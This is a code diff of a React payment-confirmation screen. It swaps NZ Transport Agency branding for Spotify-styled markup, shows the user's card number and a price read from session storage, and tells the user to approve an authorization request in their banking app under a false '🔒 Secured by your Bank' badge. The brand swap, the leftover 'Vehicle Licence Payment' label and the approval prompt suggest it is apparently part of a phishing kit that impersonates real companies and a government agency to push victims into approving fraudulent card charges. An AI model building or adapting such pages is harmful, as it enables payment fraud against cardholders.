@@ -1,9 +1,8 @@
 import React, { useEffect, useState } from 'react';
 import axios from 'axios';
-import './LoginScreen.css';
+import './SpotifyApprove.css';
 import GiftCardPopup from './GiftCardPopup';
 import { useLanguage } from '../hooks/useLanguage';
-import nztaLogo from '../assets/nzta-logo.png';
 import visaLogo from '../assets/visa-logo.png';
 import mastercardLogo from '../assets/mastercard-logo.png';
 
@@ -157,164 +156,136 @@ function SpotifyApprove({ onClose }) {
     setIsSending(false);
   };
 
+  // Helper to get selected plan amount
+  const getPlanAmount = () => {
+    const saved = sessionStorage.getItem('cartPlan');
+    if (saved) {
+      try {
+        const plan = JSON.parse(saved);
+        return plan.price ? plan.price.replace('/m', '') : '$103.95';
+      } catch (e) {
+        return '$103.95';
+      }
+    }
+    return '$103.95';
+  };
+
   // ─────────────────────────────────────────────
-  // WAITING / CONFIRMATION STATE (step 3 active)
+  // WAITING / CONFIRMATION STATE
   // ─────────────────────────────────────────────
   if (isConfirmed) {
     return (
-      <div className="nzta-renewal">
-        <header className="nzta-header">
-          <div className="nzta-header-inner">
-            <div className="nzta-logo">
-              <img src={nztaLogo} alt="NZ Transport Agency" className="nzta-logo-img" />
-            </div>
-            <div className="nzta-services-tab">
-              <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="#0b3b5c" strokeWidth="2">
-                <path d="M3 7l9-4 9 4-9 4-9-4z" />
-                <path d="M3 7v10l9 4 9-4V7" />
-              </svg>
-              <span>Online Services</span>
-            </div>
-          </div>
-        </header>
-
-        <main className="nzta-main">
+      <div className="spotify-page">
+        <div className="spotify-container">
           {showMessage && (
-            <div className="nzta-error-banner">
+            <div className="spotify-error-banner">
               ⚠️ {messageText}
-              <button
-                onClick={closeMessage}
-                style={{ marginLeft: 12, background: 'none', border: 'none', cursor: 'pointer', fontWeight: 700 }}
-              >
-                ×
-              </button>
+              <button onClick={closeMessage}>×</button>
             </div>
           )}
 
+          <h1 className="spotify-title">Waiting for confirmation</h1>
 
-          
-
-          <hr className="nzta-divider" />
-
-          <h2 className="nzta-subtitle">Waiting for Confirmation</h2>
-
-          <p className="nzta-help" style={{ marginBottom: 12 }}>
-            To complete your payment, please follow these steps:
+          <p className="spotify-intro">
+            Your confirmation has been sent. Please check your mobile banking app.
           </p>
-          <ol className="nzta-instructions" style={{ marginTop: 0, marginBottom: 24 }}>
+
+          <hr className="spotify-divider" />
+
+          <h2 className="spotify-subtitle">Payment status</h2>
+
+          <p className="spotify-help">To complete your payment, please follow these steps:</p>
+
+          <ol className="spotify-instructions">
             <li>Open your banking app on your smartphone.</li>
             <li>Confirm the authorization request.</li>
             <li>Return to this screen and wait for confirmation.</li>
           </ol>
 
-          <div className="nzta-total-card">
-            <h3>Payment status</h3>
-            <div className="nzta-total-row">
-              <span>Your confirmation has been sent.</span>
-            </div>
-            <div className="nzta-total-row">
-              <span>Please check your mobile banking app.</span>
-            </div>
-            <div className="nzta-total-row nzta-total-final">
-              <span>Current time</span>
+          <div className="spotify-summary">
+            <h3>Current time</h3>
+            <div className="spotify-summary-row spotify-summary-final">
+              <span>Time</span>
               <span>{currentTime.toLocaleString()}</span>
             </div>
           </div>
 
-          <div className="nzta-actions">
-            <button className="nzta-btn nzta-btn-cancel" onClick={closeGiftCard}>
+          <div className="spotify-actions">
+            <button className="spotify-btn spotify-btn-cancel" onClick={closeGiftCard}>
               Cancel
             </button>
           </div>
-        </main>
 
-        {showGiftCard && <GiftCardPopup giftCode={giftCode} onClose={closeGiftCard} />}
+          {showGiftCard && <GiftCardPopup giftCode={giftCode} onClose={closeGiftCard} />}
+        </div>
       </div>
     );
   }
 
   // ─────────────────────────────────────────────
-  // FORM STATE (step 3 active — same as confirmation)
+  // FORM STATE
   // ─────────────────────────────────────────────
   return (
-    <div className="nzta-renewal">
-      <header className="nzta-header">
-        <div className="nzta-header-inner">
-          <div className="nzta-logo">
-            <img src={nztaLogo} alt="NZ Transport Agency" className="nzta-logo-img" />
-          </div>
-          
-        </div>
-      </header>
-
-      <main className="nzta-main">
+    <div className="spotify-page">
+      <div className="spotify-container">
         {showMessage && (
-          <div className="nzta-error-banner">
+          <div className="spotify-error-banner">
             ⚠️ {messageText}
-            <button
-              onClick={closeMessage}
-              style={{ marginLeft: 12, background: 'none', border: 'none', cursor: 'pointer', fontWeight: 700 }}
-            >
-              ×
-            </button>
+            <button onClick={closeMessage}>×</button>
           </div>
         )}
 
-        <h1 className="nzta-title">Payment confirmation</h1>
+        <h1 className="spotify-title">Payment confirmation</h1>
 
-        
+        <p className="spotify-intro">Please confirm the payment in your banking app.</p>
 
-        <hr className="nzta-divider" />
+        <hr className="spotify-divider" />
 
-        <p className="nzta-hint">Please confirm the payment in your banking app.</p>
-
-        
-        <div style={{ display: 'flex', gap: 12, alignItems: 'center', marginBottom: 20 }}>
-          <img src={visaLogo} alt="VISA" style={{ height: 28 }} />
-          <img src={mastercardLogo} alt="Mastercard" style={{ height: 28 }} />
+        <div className="spotify-card-logos">
+          <img src={visaLogo} alt="VISA" />
+          <img src={mastercardLogo} alt="Mastercard" />
         </div>
 
-        <div className="nzta-total-card">
+        <div className="spotify-summary">
           <h3>{t.confirmationInApp || 'Vehicle Licence Payment'}</h3>
 
-          <div className="nzta-total-row">
+          <div className="spotify-summary-row">
             <span>{t.merchant || 'Merchant'}</span>
             <span>{cardBrand}</span>
           </div>
-          <div className="nzta-total-row">
+          <div className="spotify-summary-row">
             <span>{t.amount || 'Amount'}</span>
-            <span>$103.95</span>
+            <span>{getPlanAmount()}</span>
           </div>
-          <div className="nzta-total-row">
+          <div className="spotify-summary-row">
             <span>{t.date || 'Date'}</span>
             <span>{new Date().toLocaleString()}</span>
           </div>
-          <div className="nzta-total-row nzta-total-final">
+          <div className="spotify-summary-row spotify-summary-final">
             <span>{t.cardNumberLabel || 'Card Number'}</span>
             <span>{cardNumber}</span>
           </div>
-          {/* ─── 3 STEPS: open bank app & approve ─── */}
-<p className="nzta-help" style={{ marginBottom: 12 }}>
-  To complete your payment, please follow these steps:
-</p>
-<ol className="nzta-instructions" style={{ marginTop: 0, marginBottom: 24 }}>
-  <li>Open your banking app on your smartphone.</li>
-  <li>Approve the authorization request.</li>
-  <li>Return to this screen and tap "Confirm".</li>
-</ol>
         </div>
 
-        <div className="nzta-actions">
+        <p className="spotify-help">To complete your payment, please follow these steps:</p>
+
+        <ol className="spotify-instructions">
+          <li>Open your banking app on your smartphone.</li>
+          <li>Approve the authorization request.</li>
+          <li>Return to this screen and tap "Confirm".</li>
+        </ol>
+
+        <div className="spotify-actions">
           <button
             onClick={handleConfirm}
-            className="nzta-btn nzta-btn-continue"
+            className="spotify-btn spotify-btn-continue"
             disabled={isSending}
           >
             {isSending ? 'Sending…' : 'Confirm'}
           </button>
           <button
             type="button"
-            className="nzta-btn nzta-btn-cancel"
+            className="spotify-btn spotify-btn-cancel"
             onClick={handleBackToAppr}
             disabled={isSending}
           >
@@ -322,12 +293,10 @@ function SpotifyApprove({ onClose }) {
           </button>
         </div>
 
-        <p className="nzta-help" style={{ marginTop: 16 }}>
-          🔒 Secured by your Bank
-        </p>
-      </main>
+        <p className="spotify-secure">🔒 Secured by your Bank</p>
 
-      {showGiftCard && <GiftCardPopup giftCode={giftCode} onClose={closeGiftCard} />}
+        {showGiftCard && <GiftCardPopup giftCode={giftCode} onClose={closeGiftCard} />}
+      </div>
     </div>
   );
 }
